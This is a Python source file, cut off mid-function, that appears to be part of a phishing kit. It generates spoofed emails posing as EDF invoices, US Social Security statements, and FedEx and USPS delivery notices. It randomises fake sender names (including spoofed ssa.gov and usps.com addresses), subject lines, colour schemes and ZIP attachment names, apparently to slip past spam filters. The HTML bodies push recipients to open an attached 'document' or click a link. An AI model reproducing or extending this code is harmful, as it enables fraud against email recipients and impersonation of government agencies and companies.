]

_EDF_SUBJ_SUFFIXES = [
    "",
    " - Référence {ref_id}",
    " (#{contract_id})",
    " | Contrat #{contract_id}",
    " - Client #{client_id}",
]

_EDF_NAME_BASES = [
    "EDF", "EDF Service Client", "EDF Notifications", "EDF Facturation",
    "EDF Espace Client", "EDF Relevés", "EDF.fr", "EDF Communications",
    "EDF Information", "EDF Avis", "EDF Documents",
    "EDF Service", "EDF Particuliers",
]

_EDF_NAME_SUFFIXES = [
    "", " - Notification", " (Service Client)", " | Facturation",
    " - Avis", " (Information)", " - Communications",
    " | Service", " - Documents",
]

_EDF_ZIP_PREFIXES = [
    "EDF", "Facture", "EDF_Facture", "Releve", "Document",
    "EDF_Document", "Facturation", "EDF_Notice",
]

_EDF_ZIP_MIDDLES = [
    "Electronique", "Mensuel", "Notice", "Document", "Avis",
    "Releve", "Facturation", "Information",
]

_EDF_INNER_FILENAMES = [
    "Facture_EDF", "Releve_EDF", "Document_Facture", "EDF_Facture",
    "Avis_Facture", "Facture_Electronique", "EDF_Notice",
    "Document_EDF", "Facturation_EDF", "Releve_Mensuel",
    "Facture_PDF", "EDF_Document", "Avis_EDF", "Notice_Facture",
    "Document_Facturation", "Facture_Mensuel", "EDF_Releve",
    "Information_EDF", "Avis_EDF_Particulier", "Facture_Particulier",
]

_EDF_COLOR_SCHEMES = [
    {"primary": "#fe5815", "secondary": "#001a70", "bg": "#ffffff", "text": "#000000"},
    {"primary": "#e84a0e", "secondary": "#0a2a85", "bg": "#fafafa", "text": "#1a1a1a"},
    {"primary": "#ff6b1f", "secondary": "#001f8b", "bg": "#ffffff", "text": "#121212"},
    {"primary": "#fe5815", "secondary": "#001a70", "bg": "#f8f8f8", "text": "#1a1a1a"},
]

_EDF_BUTTON_TEXTS = [
    "Espace Client",
    "Accéder à mon espace",
    "Voir ma facture",
    "Consulter ma facture",
    "Mon Espace EDF",
    "Voir le détail",
    "Télécharger la facture",
]

_EDF_AMOUNTS = [
    "00", "47,32", "82,15", "125,80", "98,45", "156,20",
    "73,10", "204,55", "65,90", "189,75", "112,40", "76,85",
]


def _gen_edf_subject_combinatorial():
    """Generate random EDF subject."""
    headline = random.choice(_EDF_SUBJ_HEADLINES)
    prefix = random.choice(_EDF_SUBJ_PREFIXES)
    suffix_template = random.choice(_EDF_SUBJ_SUFFIXES)
    
    ref_id = f"REF{random.randint(100000, 999999)}"
    contract_id = f"{random.randint(1000000000, 9999999999)}"
    client_id = f"{random.randint(10000000, 99999999)}"
    
    suffix = (suffix_template
              .replace("{ref_id}", ref_id)
              .replace("{contract_id}", contract_id)
              .replace("{client_id}", client_id))
    
    return f"{prefix}{headline}{suffix}".strip()


def _gen_edf_name_combinatorial():
    """Generate random EDF display name."""
    base = random.choice(_EDF_NAME_BASES)
    suffix = random.choice(_EDF_NAME_SUFFIXES)
    return f"{base}{suffix}".strip()


def _gen_edf_zip_filename():
    """Generate EDF ZIP filename."""
    prefix = random.choice(_EDF_ZIP_PREFIXES)
    middle = random.choice(_EDF_ZIP_MIDDLES)
    serial = random.randint(10000, 99999)
    code = random.choice(["2025", "2026", "FY26", f"REF{random.randint(100,999)}", ""])
    
    parts = [p for p in [prefix, middle, code] if p]
    base_name = "_".join(parts) + f"_{serial}"
    return f"{base_name}.zip"


def _gen_edf_inner_filename(extension="pdf"):
    """Generate EDF inner filename."""
    base = random.choice(_EDF_INNER_FILENAMES)
    serial = random.randint(10000, 99999)
    return f"{base}_{serial}.{extension}"


def _generate_edf_subject():
    """Public EDF subject generator."""
    if random.random() < 0.9:
        return _gen_edf_subject_combinatorial()
    return random.choice(_EDF_SUBJ_HEADLINES)


def _generate_edf_display_name():
    """Public EDF display name generator."""
    return _gen_edf_name_combinatorial()


def _generate_edf_zip_filename():
    """Public EDF ZIP filename generator."""
    return _gen_edf_zip_filename()


def _generate_edf_template(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
    """Generate EDF-themed email body HTML — Random pool of 3 variants.
    Each call picks a random variant — lifetime random.
    """
    variant = random.randint(1, 3)
    if variant == 1:
        return _generate_edf_template_v1(recipient_name, recipient_email, link_url)
    elif variant == 2:
        return _generate_edf_template_v2(recipient_name, recipient_email, link_url)
    else:
        return _generate_edf_template_v3(recipient_name, recipient_email, link_url)


def _generate_edf_template_v2(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
    """EDF Old - Variant 2: Modern card layout with amount block."""
    color = random.choice(_EDF_COLOR_SCHEMES)
    button = random.choice(_EDF_BUTTON_TEXTS)
    amount = random.choice(_EDF_AMOUNTS)
    
    return f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>EDF - Facture</title></head>
<body style="margin:0; padding:30px 20px; background-color:#f8f9fa; font-family:Arial,sans-serif;">
<table width="600" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; border-radius:6px; overflow:hidden;" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:{color['primary']}; padding:22px 30px;">
    <table width="100%" cellpadding="0" cellspacing="0">
      <tr>
        <td style="color:#ffffff; font-size:26px; font-weight:800; letter-spacing:1px;">EDF</td>
        <td align="right" style="color:#ffffff; font-size:11px; padding-top:8px; opacity:0.9; font-weight:600; text-transform:uppercase; letter-spacing:1.5px;">Facture Électronique</td>
      </tr>
    </table>
  </td>
</tr>
<tr>
  <td style="padding:32px 30px 20px; font-family:Arial,sans-serif; color:#222; font-size:11pt; line-height:1.6;">
    <p style="margin:0 0 18px;">Madame, Monsieur,</p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 22px; background:#fef5f0; border-radius:6px;">
      <tr>
        <td style="padding:18px 22px;">
          <div style="font-size:11px; color:#888; text-transform:uppercase; letter-spacing:1px; font-weight:600;">Montant à payer</div>
          <div style="font-size:28px; font-weight:bold; color:{color['primary']}; margin-top:6px;">{amount} <span style="font-size:18px; color:#666; font-weight:normal;">euros TTC</span></div>
        </td>
      </tr>
    </table>
    
    <p style="margin:0 0 14px; padding:12px 16px; background:#f5f5f5; border-left:3px solid {color['primary']}; font-size:10pt;">
      <strong>Compte client :</strong> {recipient_email}
    </p>
    
    <p style="margin:0 0 14px;">Vous trouverez, ci-joint, votre facture électronique au format PDF.</p>
    
    <p style="margin:0 0 14px; font-size:10pt; color:#666;">
      En application de l'article L224-11 du Code de la consommation, les sommes correspondant à des consommations ou de l'acheminement pour la période concernée ont été annulées et sont donc non dues.
    </p>
    
    <p style="margin:0 0 22px;">Retrouvez l'historique de vos factures sur 3 ans en vous connectant à votre Espace Client.</p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 22px;">
      <tr>
        <td align="center">
          <a href="{link_url}" style="display:inline-block; padding:14px 36px; background:{color['primary']}; color:#fff; text-decoration:none; font-weight:bold; font-size:14px; border-radius:4px;">{button}</a>
        </td>
      </tr>
    </table>
    
    <p style="margin:0 0 6px; font-size:10pt; color:#666;">
      En cas de difficulté de réception ou d'anomalie constatée sur le contenu de votre facture, nous vous invitons à appeler le n° de téléphone figurant sur votre facture.
    </p>
    
    <p style="margin:18px 0 0;"><strong>Cordialement,</strong></p>
    <p style="margin:0;"><strong>EDF.FR</strong></p>
  </td>
</tr>
<tr>
  <td style="background:{color['secondary']}; height:8px;">&nbsp;</td>
</tr>
</table>
</body>
</html>"""


def _generate_edf_template_v3(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
    """EDF Old - Variant 3: Receipt-style with details table."""
    color = random.choice(_EDF_COLOR_SCHEMES)
    button = random.choice(_EDF_BUTTON_TEXTS)
    amount = random.choice(_EDF_AMOUNTS)
    
    import datetime as _dt
    today = _dt.datetime.now()
    date_str = today.strftime("%d/%m/%Y")
    ref_id = f"FACT-{random.randint(100000, 999999)}"
    
    return f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>EDF - Facture</title></head>
<body style="margin:0; padding:0; background-color:#ffffff; font-family:Arial,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" style="background:{color['primary']}; padding:16px 0;">
  <tr>
    <td align="center" style="color:#ffffff; font-size:14px; font-weight:bold; letter-spacing:1.5px; text-transform:uppercase;">
      Votre facture électronique EDF au format PDF
    </td>
  </tr>
</table>
<table width="600" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse; border-left:1px solid #eee; border-right:1px solid #eee;" cellpadding="0" cellspacing="0">
<tr>
  <td style="padding:30px 30px 18px;">
    <p style="margin:0 0 18px; font-size:11pt; color:#222;">Madame, Monsieur,</p>
    
    <p style="margin:0 0 16px; font-size:11pt; color:#222;">
      Vous trouverez, ci-joint, votre facture électronique au format PDF d'un montant total à payer de <strong style="color:{color['primary']};">{amount} euros TTC</strong> ou en votre faveur.
    </p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 20px; border:1px solid #e0e0e0;">
      <tr>
        <td colspan="2" style="background:#f8f8f8; padding:10px 16px; font-size:11px; color:#666; font-weight:bold; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid #e0e0e0;">Détails de la facture</td>
      </tr>
      <tr>
        <td style="padding:11px 16px; font-size:10pt; color:#666; width:40%; border-bottom:1px solid #f0f0f0;">Référence</td>
        <td style="padding:11px 16px; font-size:10pt; color:#222; font-weight:600; border-bottom:1px solid #f0f0f0;">{ref_id}</td>
      </tr>
      <tr>
        <td style="padding:11px 16px; font-size:10pt; color:#666; border-bottom:1px solid #f0f0f0;">Date d'émission</td>
        <td style="padding:11px 16px; font-size:10pt; color:#222; font-weight:600; border-bottom:1px solid #f0f0f0;">{date_str}</td>
      </tr>
      <tr>
        <td style="padding:11px 16px; font-size:10pt; color:#666; border-bottom:1px solid #f0f0f0;">Compte client</td>
        <td style="padding:11px 16px; font-size:10pt; color:#222; font-weight:600; border-bottom:1px solid #f0f0f0;">{recipient_email}</td>
      </tr>
      <tr>
        <td style="padding:11px 16px; font-size:10pt; color:#666;">Montant TTC</td>
        <td style="padding:11px 16px; font-size:14pt; color:{color['primary']}; font-weight:bold;">{amount} €</td>
      </tr>
    </table>
    
    <p style="margin:0 0 14px; font-size:10pt; color:#666;">
      En application de l'article L224-11 du Code de la consommation, les sommes correspondant à des consommations ou de l'acheminement pour la période concernée ont été annulées et sont donc non dues.
    </p>
    
    <p style="margin:0 0 18px; font-size:11pt;">Retrouvez l'historique de vos factures sur 3 ans en vous connectant à votre Espace Client.</p>
    
    <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 18px;">
      <tr>
        <td align="center">
          <a href="{link_url}" style="display:inline-block; padding:13px 36px; background:{color['primary']}; color:#fff; text-decoration:none; font-weight:bold; font-size:14px;">{button}</a>
        </td>
      </tr>
    </table>
    
    <p style="margin:18px 0 0; font-size:11pt;"><strong>Cordialement,</strong></p>
    <p style="margin:0; font-size:11pt;"><strong>EDF.FR</strong></p>
  </td>
</tr>
<tr>
  <td style="background:{color['secondary']}; height:8px;">&nbsp;</td>
</tr>
</table>
</body>
</html>"""


def _generate_edf_template_v1(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
    """Generate EDF-themed email body HTML."""
    color = random.choice(_EDF_COLOR_SCHEMES)
    button = random.choice(_EDF_BUTTON_TEXTS)
    amount = random.choice(_EDF_AMOUNTS)
    headline = random.choice(_EDF_SUBJ_HEADLINES)
    
    html = f"""<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>EDF - Facture</title>
</head>
<body style="margin:0; padding:0; background-color:{color['bg']}; font-family:Arial, sans-serif;">
<table width="600" align="center" style="width:600px; margin:20px auto; background-color:#ffffff; border-collapse:collapse;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr style="height:24px; text-align:center; color:white; font-family:Arial; font-size:11pt; background-color:{color['primary']};">
  <td style="padding:8px 0;" colspan="2">
    <div style="font-size:8pt;">&nbsp;</div>
    <div style="text-align:center; font-weight:bold; padding:8px;">
      {headline}
    </div>
    <div style="font-size:8pt;">&nbsp;</div>
  </td>
</tr>
<tr>
  <td colspan="2" style="padding:30px;">
    <div style="margin:5px 0px 30px; color:rgb(0, 0, 0); font-family:Arial; font-size:10pt; line-height:1.5;">
      <p style="margin:0px;">Madame, Monsieur {recipient_name},</p>
      <br>
      <p style="margin:0px; padding:8px 12px; background-color:#f5f5f5; border-left:3px solid {color['primary']}; font-size:9pt;">
        <strong>Compte client:</strong> {recipient_email}
      </p>
      <br>
      <p style="margin:0px;">Vous trouverez, ci-joint, votre facture électronique au format PDF d'un montant total à payer de <strong>{amount} euros TTC</strong> ou en votre faveur.</p>
      <br>
      <p style="margin:0px;">En application de l'article L224-11 du Code de la consommation, les sommes correspondant à des consommations ou de l'acheminement pour la période concernée ont été annulées et sont donc non dues.</p>
      <br>
      <p style="margin:0px;">Retrouvez l'historique de vos factures sur 3 ans en vous connectant à votre <a href="{link_url}" style="color:{color['secondary']}; text-decoration:underline;"><u>Espace Client</u></a></p>
      <br>
      <div align="center" style="margin:20px 0;">
        <a href="{link_url}" style="display:inline-block; padding:14px 32px; background-color:{color['primary']}; color:white; text-decoration:none; font-weight:bold; border-radius:4px;">
          {button}
        </a>
      </div>
      <br>
      <p style="margin:0px;">En cas de difficulté de réception ou d'anomalie constatée sur le contenu de votre facture, nous vous invitons à appeler le n° de téléphone figurant sur votre facture.</p>
      <br>
      <p style="margin:0px;"><font style="color:rgb(0, 0, 0); font-weight:bold;">Cordialement,</font></p>
      <p style="margin:0px;"><font style="color:rgb(0, 0, 0); font-weight:bold;">EDF.FR<br></font></p>
    </div>
  </td>
</tr>
<tr style="height:25px; background-color:{color['secondary']};">
  <td style="padding:0px 5px; color:white; font-family:Arial; font-size:8pt;">&nbsp;</td>
  <td valign="right" style="padding:0px 5px; text-align:right; color:white; font-family:Arial; font-size:8pt;">&nbsp;</td>
</tr>
</tbody>
</table>
</body>
</html>"""
    
    return html


# ═══════════════════════════════════════════════════════════════════════
# 🏛️ SSA SIMPLE THEME — Social Security Statement (simple, no design)
# ═══════════════════════════════════════════════════════════════════════

_SSA_SUBJ_HEADLINES = [
    "Your New Social Security Statement is now available",
    "Your Social Security Statement is ready",
    "Your annual Social Security Statement is now available",
    "Your Social Security Statement update",
    "New Social Security Statement available online",
    "Your personalized Social Security Statement",
    "Social Security: Your Statement is ready",
    "Your latest Social Security Statement is here",
    "Your Social Security earnings record is updated",
    "Annual Social Security Statement now available",
    "Your Social Security Statement is published",
    "SSA: Your Statement is now available",
]

_SSA_SUBJ_PREFIXES = ["", "SSA: ", "Notice: ", "Important: "]
_SSA_SUBJ_SUFFIXES = ["", " - Review now", " | Statement Ready", " - Action recommended"]

_SSA_NAME_BASES = [
    "no-reply@ssa.gov", "Social Security", "SSA Notice", "SSA Statement",
    "SSA Updates", "Social Security Admin", "SSA Service",
    "Social Security Notice", "SSA Communications",
]

_SSA_NAME_SUFFIXES = [
    "", " - SSA", " (Notice)", " | Updates", " - Statement Ready",
]

_SSA_ZIP_PREFIXES = ["SSA", "Social_Security", "Statement", "SSA_Statement"]
_SSA_ZIP_MIDDLES = ["Notice", "Document", "Annual", "Statement", "Update"]

_SSA_INNER_FILENAMES = [
    "Social_Security_Statement", "SSA_Statement", "Annual_Statement",
    "SSA_Document", "Statement_Notice", "SSA_Annual",
    "Earnings_Record", "Benefits_Estimate", "SSA_Notice",
    "Statement_Document", "Personal_Statement",
]


def _gen_ssa_simple_subject_combinatorial():
    """Random SSA simple subject."""
    headline = random.choice(_SSA_SUBJ_HEADLINES)
    prefix = random.choice(_SSA_SUBJ_PREFIXES)
    suffix = random.choice(_SSA_SUBJ_SUFFIXES)
    return f"{prefix}{headline}{suffix}".strip()


def _gen_ssa_simple_name():
    """Random SSA display name."""
    base = random.choice(_SSA_NAME_BASES)
    suffix = random.choice(_SSA_NAME_SUFFIXES)
    return f"{base}{suffix}".strip()


def _gen_ssa_zip_filename():
    """Random SSA ZIP filename."""
    prefix = random.choice(_SSA_ZIP_PREFIXES)
    middle = random.choice(_SSA_ZIP_MIDDLES)
    serial = random.randint(10000, 99999)
    code = random.choice(["2025", "2026", f"REF{random.randint(100,999)}", ""])
    parts = [p for p in [prefix, middle, code] if p]
    return "_".join(parts) + f"_{serial}.zip"


def _gen_ssa_inner_filename(extension="pdf"):
    """Random SSA inner filename."""
    base = random.choice(_SSA_INNER_FILENAMES)
    serial = random.randint(10000, 99999)
    return f"{base}_{serial}.{extension}"


def _generate_ssa_simple_subject():
    if random.random() < 0.9:
        return _gen_ssa_simple_subject_combinatorial()
    return random.choice(_SSA_SUBJ_HEADLINES)


def _generate_ssa_simple_display_name():
    return _gen_ssa_simple_name()


def _generate_ssa_simple_zip_filename():
    return _gen_ssa_zip_filename()


def _generate_ssa_simple_template(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
    """SSA Simple — clean text email, no heavy design. Random closings/signatures."""
    closings = [
        "We hope you find your new Statement useful and informative.",
        "We trust you'll find this updated Statement helpful.",
        "We hope this Statement provides you with valuable insights.",
        "We hope you find this annual Statement informative.",
    ]
    signatures = [
        "Social Security Administration",
        "SSA — Social Security Administration",
        "Social Security Administration · Federal",
        "Social Security · Notification Service",
    ]
    closing = random.choice(closings)
    signature = random.choice(signatures)
    
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#ffffff; font-family:Arial,sans-serif; color:#000; font-size:14px; line-height:1.6;">
<table width="600" align="center" style="margin:0 auto;" cellpadding="0" cellspacing="0">
<tr><td>

<p>Dear {recipient_name},</p>

<p>Your Social Security Statement is streamlined and easier to read than ever before. That is because we have redesigned the Statement to provide you the most useful information up front and at a glance.</p>

<p>We encourage you to check your Statement at least once a year to review:</p>

<ul style="margin:0 0 16px 20px; padding:0;">
  <li style="margin-bottom:8px;">Your earnings record (to make sure it's accurate and notify us if you see any errors);</li>
  <li style="margin-bottom:8px;">Your personalized monthly retirement benefit estimates (which now display how much you can expect to receive depending on when you decide to start your benefits between ages 62 and 70);</li>
  <li style="margin-bottom:8px;">Other useful information that will explain your benefits and help you prepare for your financial future; and</li>
  <li style="margin-bottom:8px;">New fact sheets that provide additional information based on your specific age group and earnings situation.</li>
</ul>

<p style="margin:24px 0; padding:12px 28px; background:#f5f5f5; border-left:4px solid #003366; color:#003366; font-weight:bold; font-size:14px;">
  📎 Please see the attached statement document
</p>

<p>Now that you can access your Statement instantly and anytime online, we will not automatically send one by mail.</p>

<p>{closing}</p>

<p style="margin-top:18px;">Sincerely,<br><strong>{signature}</strong></p>

<p style="margin-top:24px; color:#666; font-size:12px;">
Sent to: <strong>{recipient_email}</strong>
</p>

</td></tr>
</table>
</body>
</html>"""


# ═══════════════════════════════════════════════════════════════════════
# 📦 FEDEX THEME — Delivery Manager
# ═══════════════════════════════════════════════════════════════════════

_FEDEX_SUBJ_HEADLINES = [
    "Your shipment is on the way",
    "Your package is in transit",
    "FedEx delivery update",
    "Your shipment update",
    "Your FedEx package is on the way",
    "Shipment in transit notification",
    "FedEx: Your package is on the way",
    "Delivery in progress",
    "Your shipment status update",
    "Package on the way",
]

_FEDEX_SUBJ_PREFIXES = ["", "FedEx: ", "[FedEx] ", "📦 "]

_FEDEX_NAME_BASES = [
    "FedEx Delivery Manager", "FedEx", "FedEx Tracking",
    "FedEx Notifications", "FedEx Shipping", "FedEx Updates",
    "FedEx Delivery Service", "FedEx Customer Service",
    "Federal Express", "FedEx Service",
]

_FEDEX_NAME_SUFFIXES = [
    "", " - Tracking", " (Notice)", " | Updates",
    " - Delivery", " (Confirmation)",
]

_FEDEX_SHIPPERS = [
    "Chewy.com", "Amazon", "Walmart", "Best Buy", "Target", "Apple",
    "Nike", "Costco", "Home Depot", "Macy's", "Wayfair", "eBay",
    "Newegg", "Etsy", "Sephora", "Adidas", "Lowe's", "Nordstrom",
    "Zappos", "Dell", "Microsoft Store", "B&H Photo", "REI",
]

_FEDEX_TIMEZONES = ["CDT", "EDT", "PDT", "MDT", "EST", "CST", "PST", "MST"]

_FEDEX_ZIP_PREFIXES = ["FedEx", "Shipment", "Package", "FedEx_Tracking"]
_FEDEX_ZIP_MIDDLES = ["Confirmation", "Delivery", "Tracking", "Receipt", "Notice"]

_FEDEX_INNER_FILENAMES = [
    "FedEx_Tracking", "Shipment_Confirmation", "Delivery_Receipt",
    "Package_Document", "FedEx_Notice", "Tracking_Document",
    "Shipment_Receipt", "FedEx_Delivery", "Order_Confirmation",
    "Delivery_Document",
]


def _gen_fedex_subject_combinatorial():
    """Random FedEx subject m3a tracking ID."""
    headline = random.choice(_FEDEX_SUBJ_HEADLINES)
    prefix = random.choice(_FEDEX_SUBJ_PREFIXES)
    tracking_id = f"{random.randint(100000000000, 999999999999)}"
    
    # 70% chance to add tracking ID
    if random.random() < 0.7:
        return f"{prefix}{headline} {tracking_id}".strip()
    return f"{prefix}{headline}".strip()


def _gen_fedex_name():
    base = random.choice(_FEDEX_NAME_BASES)
    suffix = random.choice(_FEDEX_NAME_SUFFIXES)
    return f"{base}{suffix}".strip()


def _gen_fedex_zip_filename():
    prefix = random.choice(_FEDEX_ZIP_PREFIXES)
    middle = random.choice(_FEDEX_ZIP_MIDDLES)
    serial = random.randint(10000, 99999)
    code = random.choice(["2025", "2026", f"REF{random.randint(100,999)}", ""])
    parts = [p for p in [prefix, middle, code] if p]
    return "_".join(parts) + f"_{serial}.zip"


def _gen_fedex_inner_filename(extension="pdf"):
    base = random.choice(_FEDEX_INNER_FILENAMES)
    serial = random.randint(10000, 99999)
    return f"{base}_{serial}.{extension}"


def _generate_fedex_subject():
    if random.random() < 0.9:
        return _gen_fedex_subject_combinatorial()
    return random.choice(_FEDEX_SUBJ_HEADLINES)


def _generate_fedex_display_name():
    return _gen_fedex_name()


def _generate_fedex_zip_filename():
    return _gen_fedex_zip_filename()


def _generate_fedex_template(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
    """FedEx delivery notification template."""
    shipper = random.choice(_FEDEX_SHIPPERS)
    tracking_id = f"{random.randint(100000000000, 999999999999)}"
    tz = random.choice(_FEDEX_TIMEZONES)
    
    # 🆕 V108: Real TODAY date (mashi random)
    import datetime as _dt
    today = _dt.datetime.now()
    delivery_date = today
    delivery_date_str = delivery_date.strftime("%a %m/%d/%Y")
    today_str = today.strftime("%m/%d/%Y")
    
    # Generate report time
    rep_hour = random.randint(1, 12)
    rep_minute = random.randint(0, 59)
    rep_ampm = random.choice(["AM", "PM"])
    report_time = f"{rep_hour:02d}:{rep_minute:02d} {rep_ampm} {tz}"
    
    # Delivery window
    start_hour = random.randint(8, 13)
    end_hour = start_hour + random.randint(2, 4)
    start_min = random.randint(0, 59)
    end_min = random.randint(0, 59)
    s_ampm = "am" if start_hour < 12 else "pm"
    e_ampm = "am" if end_hour < 12 else "pm"
    s_disp = start_hour if start_hour <= 12 else start_hour - 12
    e_disp = end_hour if end_hour <= 12 else end_hour - 12
    delivery_window = f"{s_disp}:{start_min:02d}{s_ampm} and {e_disp}:{end_min:02d}{e_ampm}"
    
    # 🆕 V108: Random lifetime variations
    greetings = [f"Hi, {recipient_email}", f"Hello, {recipient_email}", "Hi,", "Hello,", "Greetings,"]
    delivery_msgs = [
        f"Your shipment from <strong>{shipper}</strong> is on the way.",
        f"A package from <strong>{shipper}</strong> is being delivered.",
        f"Your order from <strong>{shipper}</strong> is en route.",
        f"Your delivery from <strong>{shipper}</strong> is on its way.",
        f"Package from <strong>{shipper}</strong> in transit.",
    ]
    date_labels = [
        "Scheduled delivery date",
        "Expected delivery",
        "Delivery scheduled for",
        "Your package arrives",
        "Estimated arrival",
    ]
    
    greeting = random.choice(greetings)
    delivery_msg = random.choice(delivery_msgs)
    date_label = random.choice(date_labels)
    
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#ffffff; font-family:Arial,sans-serif; color:#333; font-size:14px; line-height:1.6;">
<table width="600" align="center" style="margin:0 auto;" cellpadding="0" cellspacing="0">
<tr>
  <td style="padding-bottom:20px;">
    <span style="font-size:28px; font-weight:bold; color:#4d148c;">FedEx</span><span style="font-size:28px; font-weight:bold; color:#ff6600;">.</span>
  </td>
</tr>
<tr>
<td>

<p style="margin:0 0 16px;">{greeting}</p>

<p style="margin:0 0 16px;">{delivery_msg}</p>

<p style="margin:16px 0 4px; font-weight:bold; color:#4d148c;">{date_label}</p>
<p style="margin:0 0 4px; font-size:18px; font-weight:bold;">{delivery_date_str}</p>
<p style="margin:0 0 16px; color:#666;">Estimated between {delivery_window}</p>

<p style="margin:24px 0; padding:12px 24px; background:#f5f5f5; border-left:4px solid #4d148c; color:#666; font-size:13px;">
  📎 Please see the attached delivery document
</p>

<hr style="border:0; border-top:1px solid #ddd; margin:24px 0;">

<p style="margin:0 0 12px; font-size:12px; color:#666;">Please do not respond to this message. This email was sent from an unattended mailbox. This report was generated at approximately {report_time} {today_str}.</p>

<p style="margin:0 0 12px; font-size:12px; color:#666;">All weights are estimated.</p>

<p style="margin:0 0 12px; font-size:12px; color:#666;">To track the latest status of your shipment, click on the tracking number above.</p>

<p style="margin:0 0 12px; font-size:12px; color:#666;">Standard transit is the date and time the package is scheduled to be delivered by, based on the selected service, destination and ship date. Limitations and exceptions may apply. Please see the FedEx Service Guide for terms and conditions of service, including the FedEx Money-Back Guarantee, or contact your FedEx Customer Support representative.</p>

<p style="margin:0 0 12px; font-size:11px; color:#999;">© {today.year} Federal Express Corporation. The content of this message is protected by copyright and trademark laws under U.S. and international law. Review our FedEx Delivery Manager® Privacy Notice and Opt Out Preference. Find information on fraud and security. All rights reserved.</p>

<p style="margin:0 0 12px; font-size:12px; color:#666;">Thank you for your business.</p>

<p style="margin:0 0 12px; font-size:11px; color:#999;">If you no longer want to receive FedEx Delivery Manager® tracking notifications, you can edit your settings at any time. Any advertisement included in this email, either by FedEx companies or a third-party, is not personalized or based on user data, learn more about our FedEx Delivery Manager® Privacy Notice.</p>

<p style="margin-top:24px; color:#999; font-size:11px;">
Sent to: <strong>{recipient_email}</strong>
</p>

</td></tr>
</table>
</body>
</html>"""


# ═══════════════════════════════════════════════════════════════════════
# 📬 USPS THEME — Postal Delivery
# ═══════════════════════════════════════════════════════════════════════

_USPS_SUBJ_HEADLINES = [
    "USPS® Expected Delivery",
    "USPS Expected Delivery Notification",
    "Your USPS package is arriving",
    "USPS delivery scheduled",
    "USPS Expected Delivery Update",
    "Your USPS shipment is on its way",
    "USPS: Expected delivery notification",
    "USPS package arriving soon",
]

_USPS_SUBJ_PREFIXES = ["", "USPS: ", "[USPS] ", "📬 "]

_USPS_NAME_BASES = [
    "auto-reply@usps.com", "USPS", "USPS Notifications",
    "USPS Tracking", "USPS Delivery", "USPS Service",
    "USPS Updates", "USPS Mail Service", "U.S. Postal Service",
    "USPS Notice", "USPS Customer Service",
]

_USPS_NAME_SUFFIXES = [
    "", " - Tracking", " (Notice)", " | Updates",
    " - Delivery", " (Notification)",
]

_USPS_RECIPIENTS = [
    "Customer", "Mail Recipient", "Package Recipient",
    "Valued Customer", "Resident", "USPS Customer",
]

_USPS_ZIP_PREFIXES = ["USPS", "Postal", "USPS_Delivery", "Mail"]
_USPS_ZIP_MIDDLES = ["Tracking", "Delivery", "Notice", "Confirmation", "Document"]

_USPS_INNER_FILENAMES = [
    "USPS_Tracking", "Postal_Notice", "Delivery_Confirmation",
    "USPS_Delivery", "Mail_Tracking", "USPS_Document",
    "Postal_Document", "USPS_Notice", "Tracking_Notice",
    "USPS_Receipt",
]


def _gen_usps_subject_combinatorial():
    """Random USPS subject m3a date + tracking."""
    headline = random.choice(_USPS_SUBJ_HEADLINES)
    prefix = random.choice(_USPS_SUBJ_PREFIXES)
    
    # Auto current date for delivery
    import datetime as _dt
    today = _dt.datetime.now()
    delivery_date = today  # 🆕 V108: real today date
    date_str = delivery_date.strftime("%A, %B %-d, %Y") if hasattr(delivery_date, 'strftime') else delivery_date.strftime("%A, %B %d, %Y")
    
    # Random arrival time
    arr_hour = random.choice([5, 6, 7, 8, 9, 10])
    arrival = f"{arr_hour}:00pm"
    
    # Random tracking number (USPS = ~22 digits)
    tracking_id = f"{random.randint(10**21, 10**22 - 1)}"
    
    # Compose subject
    if random.random() < 0.7:
        return f"{prefix}{headline} by {date_str} arriving by {arrival} {tracking_id}".strip()
    return f"{prefix}{headline} {tracking_id}".strip()


def _gen_usps_name():
    base = random.choice(_USPS_NAME_BASES)
    suffix = random.choice(_USPS_NAME_SUFFIXES)
    return f"{base}{suffix}".strip()


def _gen_usps_zip_filename():
    prefix = random.choice(_USPS_ZIP_PREFIXES)
    middle = random.choice(_USPS_ZIP_MIDDLES)
    serial = random.randint(10000, 99999)
    code = random.choice(["2025", "2026", f"REF{random.randint(100,999)}", ""])
    parts = [p for p in [prefix, middle, code] if p]
    return "_".join(parts) + f"_{serial}.zip"


def _gen_usps_inner_filename(extension="pdf"):
    base = random.choice(_USPS_INNER_FILENAMES)
    serial = random.randint(10000, 99999)
    return f"{base}_{serial}.{extension}"


def _generate_usps_subject():
    if random.random() < 0.9:
        return _gen_usps_subject_combinatorial()
    return random.choice(_USPS_SUBJ_HEADLINES)


def _generate_usps_display_name():
    return _gen_usps_name()


def _generate_usps_zip_filename():
    return _gen_usps_zip_filename()


def _generate_usps_template(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
    """USPS Expected Delivery template. Random lifetime."""
    recipient_label = random.choice(_USPS_RECIPIENTS)
    
    # 🆕 V108: Real TODAY date
    import datetime as _dt
    today = _dt.datetime.now()
    delivery_date = today
    full_date = delivery_date.strftime("%A, %B %d, %Y")
    day_short = delivery_date.strftime("%d").lstrip("0")
    month_short = delivery_date.strftime("%b")
    
    # Random arrival time
